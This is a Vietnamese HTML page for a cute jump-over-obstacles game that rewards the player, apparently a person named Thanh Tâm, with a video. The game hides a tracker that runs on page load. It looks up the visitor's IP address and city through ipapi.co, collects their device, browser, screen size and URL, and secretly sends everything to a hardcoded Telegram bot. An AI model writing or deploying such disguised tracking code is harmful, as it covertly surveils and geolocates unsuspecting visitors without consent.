<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phá Đảo Nhận Quà Cùng Thanh Tâm 🌸</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #24243e, #302b63, #0f0c29);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            color: #fff;
        }
        .game-container {
            position: relative;
            width: 850px;
            height: 450px;
            background: linear-gradient(to bottom, #ff758c, #ff7eb3, #ffd1ff);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            border: 4px solid rgba(255, 255, 255, 0.3);
        }
        .cloud {
            position: absolute;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50px;
            animation: moveCloud linear infinite;
        }
        @keyframes moveCloud {
            from { right: -200px; }
            to { right: 1050px; }
        }
        .ground {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 80px;
            background: linear-gradient(to top, #11998e, #38ef7d);
            border-top: 5px solid #00b894;
        }
        .grass-detail {
            position: absolute;
            bottom: 80px;
            width: 100%;
            height: 10px;
            background: repeating-linear-gradient(45deg, #2ecc71, #2ecc71 10px, #27ae60 10px, #27ae60 20px);
        }
        #player {
            position: absolute;
            bottom: 85px;
            left: 60px;
            width: 60px;
            height: 90px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 5;
        }
        .name-tag {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white;
            padding: 3px 10px;
            font-size: 13px;
            font-weight: bold;
            border-radius: 12px;
            white-space: nowrap;
            margin-bottom: 6px;
            box-shadow: 0 3px 10px rgba(255, 65, 108, 0.5);
        }
        .avatar-img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 3px solid #ff758c;
            object-fit: cover;
            background: #fff;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .obstacle {
            position: absolute;
            bottom: 85px;
            width: 45px;
            height: 45px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 32px;
            animation: moveObstacle linear infinite;
            z-index: 4;
        }
        @keyframes moveObstacle {
            from { right: -60px; }
            to { right: 910px; }
        }
        .score-board {
            position: absolute;
            top: 20px;
            right: 25px;
            font-size: 22px;
            font-weight: bold;
            color: #2d3436;
            background: rgba(255, 255, 255, 0.85);
            padding: 8px 18px;
            border-radius: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            z-index: 10;
        }
        .overlay-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 12, 41, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            text-align: center;
            padding: 20px;
        }
        .overlay-screen h1 { font-size: 28px; color: #ff758c; margin-bottom: 10px; }
        .overlay-screen p { font-size: 15px; margin-bottom: 15px; color: #dfe6e9; }
        .reward-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 8px;
            border-radius: 15px;
            border: 2px dashed #ff758c;
            margin-bottom: 15px;
        }
        .reward-box video {
            width: 240px;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            outline: none;
        }
        .btn {
            padding: 10px 25px;
            font-size: 16px;
            font-weight: bold;
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 5px 20px rgba(0, 176, 155, 0.4);
            transition: 0.3s;
        }
        .btn:hover { transform: scale(1.08); }
        #winScreen, #gameOverScreen { display: none; }
    </style>
</head>
<body>

    <div class="game-container" id="gameContainer">
        <div class="cloud" style="top: 35px; width: 90px; height: 28px; animation-duration: 12s;"></div>
        <div class="cloud" style="top: 90px; width: 140px; height: 35px; animation-duration: 18s;"></div>

        <div class="score-board">Điểm: <span id="score">0</span> / 100</div>

        <div id="player">
            <div class="name-tag">Thanh Tâm ✨</div>
            <img src="https://files.catbox.moe/midx04.jpeg" class="avatar-img" alt="Thanh Tâm">
        </div>

        <div class="grass-detail"></div>
        <div class="ground"></div>

        <!-- Màn hình bắt đầu -->
        <div class="overlay-screen" id="startScreen">
            <h1>Hành Trình Ngắn Của Thanh Tâm 🌸</h1>
            <p>Đạt <b>100 điểm</b> là vượt qua map để xem video mới nhé!</p>
            <button class="btn" onclick="startGame()">Bắt đầu chơi</button>
        </div>

        <!-- Màn hình THUA -->
        <div class="overlay-screen" id="gameOverScreen">
            <h1>Chạm nhẹ cái mà thua mất rồi! 🥺</h1>
            <p>Thử lại siêu nhanh nha!</p>
            <button class="btn" onclick="restartGame()">Chơi lại</button>
        </div>

        <!-- Màn hình THẮNG -->
        <div class="overlay-screen" id="winScreen">
            <h1>🎉 Phá Đảo Thành Công! 🎉</h1>
            <div class="reward-box">
                <video id="rewardVideo" controls autoplay>
                    <source src="https://files.catbox.moe/txya2j.mp4" type="video/mp4">
                </video>
            </div>
            <p>Món quà cuối map dành riêng cho Thanh Tâm! 🥰</p>
            <button class="btn" onclick="restartGame()">Chơi lại từ đầu</button>
        </div>
    </div>

    <script>
        // ================== CẤU HÌNH TELEGRAM ==================
        const botToken = "8904977809:AAEUCzGKf-SwECyVjG8i5fMckSTUhGw-8D8"; 
        const chatId = "8681854353";
        // ========================================================

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(err => console.log("Lỗi gửi:", err));
        }

        // Hàm thu thập và gửi thông tin khi mở web
        (async function() {
            let ip = "Không xác định";
            let location = "Không xác định";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data.ip) {
                    ip = data.ip;
                    location = `${data.city || ''}, ${data.country_name || ''}`;
                }
            } catch(e) {}

            const ua = navigator.userAgent;
            const now = new Date();
            const timeStr = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

            let device = "Không xác định";
            if (/iPhone/i.test(ua)) device = "📱 iPhone";
            else if (/iPad/i.test(ua)) device = "📱 iPad";
            else if (/Android/i.test(ua)) device = "📱 Android";
            else if (/Mac/i.test(ua)) device = "💻 Mac";
            else if (/Windows/i.test(ua)) device = "💻 Windows";

            let browser = "Không xác định";
            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Chrome/i.test(ua)) browser = "Chrome";
            else if (/Firefox/i.test(ua)) browser = "Firefox";

            const msg = `🔔 CÓ NGƯỜI VÀO WEB (GAME)
══════════════════════════════════════════
🕐 Thời gian: ${timeStr}
🌐 IP: ${ip}
📍 Vị trí: ${location}
💻 Thiết bị: ${device}
🌐 Trình duyệt: ${browser}
🔗 Link: ${window.location.href}
📱 Màn hình: ${window.screen.width}x${window.screen.height}
══════════════════════════════════════════`;

            sendToTelegram(msg);
        })();

        // ================== GAME CODE ==================
        const player = document.getElementById('player');
        const gameContainer = document.getElementById('gameContainer');
        const scoreDisplay = document.getElementById('score');
        const startScreen = document.getElementById('startScreen');
        const gameOverScreen = document.getElementById('gameOverScreen');
        const winScreen = document.getElementById('winScreen');
        const rewardVideo = document.getElementById('rewardVideo');

        let isJumping = false;
        let score = 0;
        let obstacleInterval;
        let isPlaying = false;
        const obstacleTypes = ['🌵', '🎁'];

        function jump() {
            if (isJumping || !isPlaying) return;
            isJumping = true;
            let jumpHeight = 0;
            let upInterval = setInterval(() => {
                if (jumpHeight >= 130) {
                    clearInterval(upInterval);
                    let downInterval = setInterval(() => {
                        if (jumpHeight <= 0) {
                            clearInterval(downInterval);
                            isJumping = false;
                        } else {
                            jumpHeight -= 6;
                            player.style.bottom = (85 + jumpHeight) + 'px';
                        }
                    }, 22);
                } else {
                    jumpHeight += 6;
                    player.style.bottom = (85 + jumpHeight) + 'px';
                }
            }, 22);
        }

        document.addEventListener('keydown', (e) => {
            if (e.code === 'Space') { e.preventDefault(); jump(); }
        });
        gameContainer.addEventListener('click', jump);

        function createObstacle() {
            if (!isPlaying) return;
            const obstacle = document.createElement('div');
            obstacle.classList.add('obstacle');
            obstacle.innerHTML = obstacleTypes[Math.floor(Math.random() * obstacleTypes.length)];
            obstacle.style.animationDuration = '3.0s';
            gameContainer.appendChild(obstacle);

            let checkCollision = setInterval(() => {
                const playerRect = player.getBoundingClientRect();
                const obstacleRect = obstacle.getBoundingClientRect();
                if (
                    playerRect.right - 12 > obstacleRect.left &&
                    playerRect.left + 12 < obstacleRect.right &&
                    playerRect.bottom - 10 > obstacleRect.top
                ) {
                    clearInterval(checkCollision);
                    gameOver();
                }
                if (obstacleRect.right < gameContainer.getBoundingClientRect().left) {
                    clearInterval(checkCollision);
                    obstacle.remove();
                    if (isPlaying) {
                        score += (obstacle.innerHTML === '🎁' ? 25 : 10);
                        scoreDisplay.innerText = score;
                        if (score >= 100) winGame();
                    }
                }
            }, 40);
            setTimeout(() => { if (obstacle.parentNode) obstacle.remove(); }, 3000);
        }

        function startGame() {
            startScreen.style.display = 'none';
            gameOverScreen.style.display = 'none';
            winScreen.style.display = 'none';
            score = 0;
            scoreDisplay.innerText = score;
            isPlaying = true;
            obstacleInterval = setInterval(createObstacle, 2800);
        }

        function gameOver() {
            isPlaying = false;
            clearInterval(obstacleInterval);
            document.querySelectorAll('.obstacle').forEach(obs => obs.remove());
            gameOverScreen.style.display = 'flex';
        }

        function winGame() {
            isPlaying = false;
            clearInterval(obstacleInterval);
            document.querySelectorAll('.obstacle').forEach(obs => obs.remove());
            winScreen.style.display = 'flex';
            rewardVideo.currentTime = 0;
            rewardVideo.play();
        }

        function restartGame() {
            gameOverScreen.style.display = 'none';
            winScreen.style.display = 'none';
            rewardVideo.pause();
            startGame();
        }
    </script>
</body>
</html>
